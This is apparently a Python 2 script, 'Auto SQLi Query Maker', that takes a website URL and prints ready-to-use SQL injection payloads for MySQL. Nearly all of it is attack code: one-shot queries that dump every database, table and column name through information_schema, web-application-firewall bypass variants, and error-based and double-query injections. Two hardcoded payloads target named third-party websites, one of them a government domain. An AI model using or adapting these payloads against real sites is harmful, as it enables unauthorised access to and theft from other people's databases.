
import time

time.sleep(.5)
print "\n        ---####################################################---"
print "      -----#                                                  #-----"
print "   --------#                 Auto SQLi Query Maker            #--------"
print "      -----#                   Coded By Alpha00               #-----"
print "        ---#                                                  #---"
print "          -####################################################-\n\n"
time.sleep(1)
print "\n"
url = raw_input("Website Vulnerable URL : ")

rp = "Just Paste This In 'Hackbar' OR 'URL Bar' And After It Do The UNION SELECTION.. Then Replace The Vulnerable Column With @x And See The MAGIC :D"
sdt = "div @x:=concat((select(@)from(Select(@:=0x00),(@r:=0),(select(@)from(information_schema.tables)Where(table_schema=database())and(@)in(@:=concat(@,0x3c62723e,LPAD(@r:=@r%2b1,2,0x30),0x2e20,unhex(hex(table_name))))))x))"
sdtc = "div @x:=concat((select(@)from(Select(@:=0x00),(select(@)from(information_schema.columns)Where(table_schema=database())and(@)in(@:=concat(@,0x3c62723e,unhex(hex(table_name)),0x203a3a3a20,unhex(hex(column_name))))))x))"
gct = "div @x:=concat(if(@a!=0,@a:=0,@a:=0),0x3c62723e3c62723e,(select unhex(hex(group_concat(lpad(@a:=@a%2b1,2,0x30),0x2e20,table_name separator 0x3c62723e))) from information_schema.tables where table_schema=database()))"
dtwf = "div @x:=concat/*!((/*!00000select*/ (@) /*!from*/ (/*!00000select*/ (@:=0x00),(@r:=0),(/*!00000select*/ (@) from(information_schema./**/tables)where(table_schema=database())and(@)in(@:=concat/*!(@,0x3c62723e,LPAD(@r:=@r%2b1,2,0x30),0x2e20,unhex(hex(table_name))))))x))*/"
dtcwf = "div @x:=concat/*!((/*!00000select*/ (@) /*!from*/ (/*!00000select*/ (@:=0x00),(@r:=0),(/*!00000select*/ (@) from(information_schema./**/columns)where(table_schema=database())and(@)in(@:=concat/*!(@,0x3c62723e,unhex(hex(table_name)),0x203a3a20,unhex(hex(column_name))))))x))*/"
mdwf = "div @x:=concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@)/*!from*/(/*!12345selEcT*/(@:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@:=Concat/*!(@, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/"
mds = "div @x:=unhex(hex(concat(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,concat(concat(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203a3a203c2f666f6e743e3c2f63656e7465723e3c2f623e),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),concat(0x3c62723e3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c62723e546f74616c205461626c657320496e20416c6c20446174616261736573203a3a20,(select count(*) from information_Schema.tables),0x3c62723e5461626c657320436f756e7420496e205072696d617279204461746162617365203a3a20,(Select count(*) from information_Schema.tables where table_schema=database()),(select(@)from(select(@:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(select(0) from(information_schema.columns)where(table_schema=database()) and(0x00)in(@:=Concat(@, 0x3c62723e, if( (@tbl!=table_name), Concat(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,LPAD(@r:=@r%2B1, 2, 0x30),0x2e,@tbl:=table_name,0x3c666f6e7420636f6c6f723d626c61636b3e203a3a20436f6c756d6e7320496e2054686973205461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@tbl),0x20284461746162617365203a3a20,database(),0x29,0x3c2f666f6e743e,0x3c62723e), 0x00),0x203a3a20,0x3c666f6e7420636f6c6f723d677265656e2073697a653d323e,0x7e20,column_name,0x3c2f666f6e743e ))))x))))))"
dd = "div @x:=concat((select(@)from(select(@:=0x00),(select(@)from(information_schema.schemata)where(@)in(@:=concat(@,0x3c62723e,unhex(hex(schema_name))))))x))"
ddwf = "div @x:=concat/*!((/*!00000select*/(@)/*!from*/(/*!00000select*/(@:=0x00),(/*!00000select*/(@)from(information_schema./**/schemata)where(@)in(@:=concat/*!(@,0x3c62723e,unhex(hex(schema_name))))))x))*/"
gcd = "div @x:=concat(if(@a!=0,@a:=0,@a:=0),0x3c62723e3c62723e,(select group_concat(lpad(@a:=@a%2b1,2,0x30),0x2e20,unhex(hex(schema_name)) separator 0x3c62723e) from information_Schema.schemata))"
bdz = "div @x:=(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(table_schema=database())and(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))"
bdzwf = "div @x:=(/*!00000select*/(/*!00000select*/ concat/*!(@:=0xa7,(/*!00000select*/ count(*)/*!from*/(information_schema./**/columns)where(table_schema=database())and(@:=concat/*!(@,0x3c6c693e,table_name,0x203a3a20,column_name))),@)*/))"
bmb = "div @x:=(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where(table_schema=database())and @:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))"
bmbwf = "div @x:=(/*!00000Select*/ export_set(5,@:=0,(/*!00000select*/ count(*)/*!from*/(information_schema./**/columns)where(table_schema=database()) and @:=export_set(5,export_set(5,@,/*!table_name*/,0x3c6c693e,2),/*!column_name*/,0x203a3a20,2)),@,2))"
msd = "div @x:=make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema=database())and @:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)"
msdwf = "div @x:=make_set(6,@:=0x0a,(/*!00000select*/(1)/*!from*/(information_schema./**/columns)where(table_schema=database())and @:=make_set(511,@,0x3c6c693e,/*!table_name*/,0x203a3a20,/*!column_name*/)),@)"
bkt = "div @x:=concat(@i:=0x00,@x:=0x00,benchmark(10,@x:=CONCAT(@x,(SELECT concat(0x3c62723e,@i:=table_name) from information_schema.tables where (table_schema=database()) and table_name >@i order by table_name LIMIT 1))),@x)"
dec = "div @x:=(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_schema,0x203a3a20,table_name,0x203a3a20,column_name))),@)))"
dewc = "div @x:=make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where @:=make_set(511,@,0x3c6c693e,table_name,0x203a20,table_name,0x203a20,column_name)),@)"
bktwf = "div @x:=concat/*!(@i:=0x00,@y:=0x00,benchmark(10,@y:=CONCAT/*!(@y,(/*!00000SELECT*/ concat/*!(0x3c62723e,@i:=table_name) /*!from*/ information_schema./**/tables where (table_schema=database()) and table_name >@i order by table_name LIMIT 1))),@y)"
decwf = "div @x:=(/*!00000select*/(/*!00000select*/ concat/*!(@:=0xa7,(/*!00000select*/ count(*)/*!from*/(information_schema./**/columns)where(@:=concat/*!(@,0x3c6c693e,table_schema,0x202d2d2d3e20,table_name,0x203a3a20,column_name))),@)*/))"
dewcwf = "div @x:=make_set(6,@:=0x0a,(/*!00000select*/(1)/*!from*/(information_schema./**/columns)where@:=make_set(511,@,0x3c6c693e,/*!table_schema*/,0x203a3a20,/*!table_name*/,0x203a3a20,/*!column_name*/)),@)"
ueb = "div @x:=%63oncaT((%53elECt (@x) %66rom (%53elECt (@x:=0x00),(@r:=0),(%53elECt (0) from(%69nformation_schema.tables)%77here (%74ablE_schema=database()) and (0x00) in (@x:=%63oncat (@x,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,2,0x30),0x2920,0x3c2f666f6e743e,%74able_name))))x)) %55nion %53elect "
escb = "div @x:=(concat_ws((0x0),(select(@)from(select(@:=0x00),(@r:=0),(select(@)from(informatioN_schema.tables)where(table_Schema=database())and(@)in(@:=concat_ws((0x0),(@),(0x3c62723e),(LPAD((@r:=@r%2b1),(2),(0x30))),(0x2e20),(table_name),(0x0)))))x))))UNION(select([No.Of Cols Here With Separate Brackets like (1),(2),(3)])"
hwb = "div @x:=concat_ws(0x00,(/*!00000select*%2f(@)/*!from*%2f(/*!00000select*%2f(@:=0x00),(/*!00000select*%2f(@)/*!from*%2f(/*!information_schema*%2f.columns)/*!where*%2f(table_schema=database/*!()*%2f)and(0x00)in/*!(@:=concat_ws(0x00,(@),(0x3c62723e),(table_name),(0x203a3a20),(column_name))*%2f)))x))"
myb = "div @x:=concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)"
uniq1 = "http://www.grandprix-tunis.gov.tn/en/index1.php?id=-21 /*!UNION*%2f /*!SELECT*%2f (1),concat_ws(0x00,(/*!00000select*%2f(@)/*!from*%2f(/*!00000select*%2f(@:=0x00),(/*!00000select*%2f(@)/*!from*%2f(/*!information_schema*%2f.columns)/*!where*%2f(table_schema=database/*!()*%2f)and(0x00)in/*!(@:=concat_ws(0x00,(@),(0x3c62723e),(table_name),(0x203a3a20),(column_name))*%2f)))x)),(3),(4),(5)"
uniq2 = "http://uit.com.pk/uit_2.php?id=2 div 0 union%23BBBBBBBBUUUUUUUUUUUFFFFFFFFFFFFFFFEEEEEEEEEEEEERRRRRRRRRRRRRRRR...OOOOOOOOVVVVVVVEEEEEEEEEERRRRRRRRRRRRRFFFFFFFLLLLLLLLLLLOOOOOOOOOOWWWWWWWWWWWW%0aselect 1,concat%23aaaaaaaaaaaaa%0a(' :: Injected By -tr0jAn* :: ' ,version%23aaaaaaaaa..aa%0a(),' :: ',database%23aaaaaa%0a()),0x0"
xp = " and updatexml(0x3a,concat(0x3a,version()),null) "
xpwf = " and updatexml(0x3a,concat/*!(0x3a,version())*/,null) "
err = " or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1"
dq = " and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(version() as char), 0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
xptwf = " and updatexml(0x3a,concat/*!(0x3a,(/*!00000SelEcT*/ concat/*!(table_name)*/ /*!from*/ information_schema./**/tables where table_schema=database() limit 0,1))*/,null) "
xpt = " and updatexml(0x3a,concat(0x3a,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),null) "
un = "UnIoN SeLEcT [No. Of Columns Here .. ]"
unf = "/*!00000UniOn*/ /*!00000Select*/ [No . Of Columns Here .. ]"

time.sleep(1)
print "\nLoading..\n"
time.sleep(.5)


waf =  raw_input("WAF ? Y or N : ")

if(waf =='y' or waf =='Y' or  waf =='yes' or waf =='YES' or waf =='Yes'):
		time.sleep(.5)
		print "\nLoading Data .. "
		time.sleep(.6)
		print "\n## :: WAF Bypassed Queries :: ## \n"
		print "\nCODE :: --Queries "
		print "01 -- -- Tables DIOS WAF Bypassed"
		print "02 -- -- Tables With Columns DIOS WAF Bypassed "
		print "03 -- -- TrojAn DIOS Query WAF Bypassed"
		print "04 -- -- XPATH Injection WAF Bypassed "
		print "05 -- -- Databases DIOS WAF Bypassed"
		print "06 -- -- Escape Character DIOS WAF Bypassed "
		print "07 -- -- URL Encoding DIOS WAF Bypassed "
		print "08 -- -- High WAF DIOS Tables With Columns Bypassed "
		print "09 -- -- DIOS  Alpha WAF Bypassed "
		print "10 -- -- DIOS  xor00 WAF Bypassed "
		print "11 -- -- DIOS Without Concat WAF Bypassed "
		print "12 -- -- Tables DIOS Using Benchmark() WAF Bypassed "
		print "13 -- -- Dumping Everything In One Shot WAF Bypassed "
		print "14 -- -- Dumping Everything In One Shot Without Concat WAF Bypassed"
		print "15 -- -- Unique WAF Site Bypassed "
		print "16 -- -- Unique Buffer OverFlow Site Bypassed "
		
		
		print "\n"
		askwf = raw_input("What Query Do You Want ? .. Please Enter Code : ")
		time.sleep(.7)
		print "\nLoading Your Query "
		time.sleep(.5)
		if(askwf =='01'):
			print "\nTables DIOS WAF Bypassed\n"
			time.sleep(.8)
			print url + " " + dtwf + unf + " " + "\n\n" + rp
		elif(askwf =='02'):
			print "\n Tables With Columns DIOS WAF Bypassed\n"
			time.sleep(.8)
			print url + " " + dtcwf + " " + unf + "\n\n" + rp
		elif(askwf =='03'):
			print "\nTrojAn DIOS Query WAF Bypassed\n"
			time.sleep(.8)
			print url + " " + mdwf + " " + unf + "\n\n" + rp
		elif(askwf =='04'):
			print "\nXPATH Injection WAF Bypassed"
			time.sleep(.8)
			print url + xpwf + "\n"
			time.sleep(.6)
			print "\n"
			xpask = raw_input("Grab Tables ? Y or N :")
			time.sleep(.8)
			if(xpask =='y' or xpask =='yes' or xpask =='Y' or xpask =='YES' or xpask =='Yes' or xpask =='Ye' or xpask =='ye'):
				print "XPATH Injection Getting Tables\n "
				time.sleep(.5)
				print url + xptwf + "\n\nIncrease The Limit By 0,1 to '1,1' -- '2,1' -- '3,1' For Getting All Other Tables "
		elif(askwf =='05'):
			print "\nDatabases DIOS WAF Bypassed\n"
			time.sleep(.8)
			print url + " " + ddwf + " " + unf + "\n\n" + rp
		elif(askwf =='06'):
			print "\nEscape Character DIOS Bypassed \n"
			time.sleep(.8)
			print url + " " + escb + " " + "\n\n" + rp
		elif(askwf =='07'):
			print "\nURL Encoding WAF Bypassed "
			time.sleep(.8)
			print url + " " + ueb + " " + "\n\n" + rp
		elif(askwf =='08'):
			print "\nHigh WAF Tables With Columns Bypassed \n"
			time.sleep(.8)
			print url + " " + hwb + " " + "/*!00000%55niOn*%2f /*!00000%53eLeCT*%2f [No. Of Columns Here With Separate Brackets like this (1),(2),(3)]" + "\n\n" + rp
		elif(askwf =='09'):
			print "\nDIOS By Dr.Z3r0 WAF Bypassed \n"
			time.sleep(.8)
			print url + " " + bdzwf + " " + unf + "\n\n" + rp
		elif(askwf =='10'):
			print "\nDIOS By MadBlood WAF Bypassed \n"
			time.sleep(.8)
			print url + " " + bmbwf + " " + unf + "\n\n" + rp
		elif(askwf =='11'):
			print "\n DIOS Without Concat WAF Bypassed \n"
			time.sleep(.8)
			print url + " " + msdwf + " " + unf + "\n\n" + rp
		elif(askwf =='12'):
			print "\nTables DIOS Using Benchmark WAF Bypassed \n"
			time.sleep(.8)
			print url + " " + bktwf + " " + unf + "\n\n" + rp
		elif(askwf =='13'):
			print "\nDumping Everything In One Shot WAF Bypassed \n"
			time.sleep(.8)
			print url + " " + decwf + " " + unf + "\n\n" + rp
		elif(askwf =='14'):
			print "\nDumping Everything In One Shot Without CONCAT WAF Bypassed\n"
			time.sleep(.8)
			print url + " " + dewcwf + " " + unf + "\n\n" + rp
		elif(askwf =='15'):
			print "\nUnique WAF Website Bypassed \n "
			time.sleep(.8)
			print "Query :: \n----------\n" + uniq1
		elif(askwf =='16'):
			print "\nUnique WAF [Buffer Overflow] Website Bypassed \n"
			time.sleep(.8)
			print "Query :: \n----------\n" + uniq2
			

				
		else:
			time.sleep(.8)
			print "You Have Entered An Invalid Code .. "
			
			
elif(waf =='N' or waf =='n' or waf =='NO' or waf =='no' or waf =='No'):
		print "## :: Simple Non-WAF Queries :: ## \n"
		time.sleep(.7)
		print "Loading Data .. "
		time.sleep(.8)
		print "\nCODE :: -- Queries \n"
		print "001 -- -- Tables DIOS Simple "
		print "002 -- -- Tables With Columns DIOS Simple "
		print "003 -- -- Getting Tables With Group_concat Function "
		print "004 -- -- TrojAn DIOS Query Simple "
		print "005 -- -- XPATH Injection "
		print "006 -- -- Databases DIOS "
		print "007 -- -- Getting Databases With Group_concat Function"
		print "008 -- -- Tables DIOS Using Benchmark() "
		print "009 -- -- DIOS By Dr.Z3ro "
		print "010 -- -- DIOS By Mad Blood "
		print "011 -- -- DIOS Without Concat "
		print "012 -- -- TrojAn Benchmark() Query "
		print "013 -- -- Dump Everything With Concat "
		print "014 -- -- Dump Everything Without Concat "
		print "015 -- -- Escape Character Bypass "
		print "016 -- -- Getting Version With Error Based Injection"
		print "017 -- -- Getting Version With Double Query Injection "
		
		print "\n"
		asks = raw_input("What Query Do You Want ? Enter Code : ")
		time.sleep(.5)
		print "Loading Your Query .."
		time.sleep(.5)
		if(asks == '001'):
			print "\nTables DIOS Simple\n"
			time.sleep(.8)
			print url + " " + sdt + " " + un + "\n\n" + rp
		elif(asks =='002'):
			print "\nTables With Columns DIOS Simple\n"
			time.sleep(.8)
			print url + " " + sdtc + " " + un + "\n\n" + rp
		elif(asks =='003'):
			print "\nGetting Tables With Group_concat Function\n"
			time.sleep(.8)
			print url + " " + gct + " " + un + "\n\n" + rp
		elif(asks =='004'):
			print "\nTrojAn DIOS Query Simple\n"
			time.sleep(.8)
			print url + " " + mds + " " + un + "\n\n" + rp
		elif(asks =='005'):
			print "\nXPATH Injection\n"
			time.sleep(.8)
			print url + xp + "\n"
			time.sleep(.6)
			xpasks = raw_input("Grab Tables ? Y or N :")
			if(xpasks =='y' or xpasks =='yes' or xpasks =='Y' or xpasks =='YES' or xpasks =='Yes' or xpasks =='Ye' or xpasks =='ye'):
				print "\nXPATH Injection Getting Tables\n "
				time.sleep(.5)
				print url + xpt + "\n\nIncrease The Limit By 0,1 to '1,1' -- '2,1' -- '3,1' For Getting All Other Tables "
		elif(asks =='006'):
			print "\nDatabases DIOS\n"
			time.sleep(.8)
			print url + " " + dd + " " + un + "\n\n" + rp
		elif(asks =='007'):
			print "\nGetting Databases With GROUP_CONCAT() Function\n"
			time.sleep(.8)
			print url + " " + gcd + " " + un + "\n\n" + rp
		elif(asks =='008'):
			print "\nTables DIOS Using Benchmark() \n"
			time.sleep(.8)
			print url + " " + bkt + " " + un + "\n\n" + rp
		elif(asks =='009'):
			print "\nDIOS by Dr.Z3ro\n"
			time.sleep(.8)
			print url + " " + bdz + " " + un + "\n\n" + rp
		elif(asks =='010'):
			print "\nDIOS By Mad Blood \n"
			time.sleep(.8)
			print url + " " + bmb + " " + un + "\n\n" + rp
		elif(asks =='011'):
			print "\nDIOS Without Concat\n"
			time.sleep(.8)
			print url + " " + msd + " " + un + "\n\n" + rp
		elif(asks =='012'):
			print "\nTrojAn Benchmark() Query\n"
			time.sleep(.8)
			print url + " " + myb + " " + un + "\n\n" + rp
		elif(asks =='013'):
			print "\nDump Everything With Concat Function\n"
			time.sleep(.8)
			print url + " " + dec + " " + un + "\n\n" + rp
		elif(asks =='014'):
			print "\nDump Everything Without Concat Function \n"
			time.sleep(.8)
			print url + " " + dewc + " " + un + "\n\n" + rp
		elif(asks =='015'):
			print "\n Escape Character Bypass \n"
			time.sleep(.8)
			print url + " " + escb + "\n\n" + rp
		elif(asks =='016'):
			print "\nGetting Version With Error Based Injection\n"
			time.sleep(.8)
			print url + err + "\n\n"
		elif(asks =='017'):
			print "\nGetting Version With Double Query Injection\n"
			time.sleep(.8)
			print url + dq + "\n\n"
		
				
		
		else:
			time.sleep(.8)
			print "You Have Entered An Invalid Code "
		
else:
		print "You Have Entered An Incorrect Data"
		
		

time.sleep(2)
print "\n\n\nClosing All Functions.."
time.sleep(1)
print "Exiting.."
time.sleep(3.5)
